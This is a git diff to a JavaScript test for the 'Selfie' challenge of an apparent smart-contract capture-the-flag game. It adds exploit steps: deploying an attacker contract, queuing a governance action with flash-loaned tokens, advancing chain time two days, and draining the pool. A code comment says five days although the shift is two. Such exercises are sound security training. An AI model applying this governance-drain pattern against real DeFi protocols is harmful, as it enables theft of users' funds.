@@ -14,13 +14,15 @@ describe('[Challenge] Selfie', function () {
         const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
         const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
         const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
+        const AttackerDrainSelfiePoolFactory= await ethers.getContractFactory('DrainSelfiePool',attacker)
 
         this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
         this.pool = await SelfiePoolFactory.deploy(
-            this.token.address,
-            this.governance.address    
+            this.token.address,//DVT token address
+            this.governance.address//governance contract address
         );
+        this.attackerContract=await AttackerDrainSelfiePoolFactory.deploy(this.governance.address,this.pool.address);
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
@@ -31,6 +33,11 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.attackerContract.connect(attacker).proposeGovernanceAction(TOKEN_INITIAL_SUPPLY)
+        //CEKAJ 2 DANA
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        //executaj proposanu akciju
+        await this.attackerContract.connect(attacker).drainPool()
     });
 
     after(async function () {
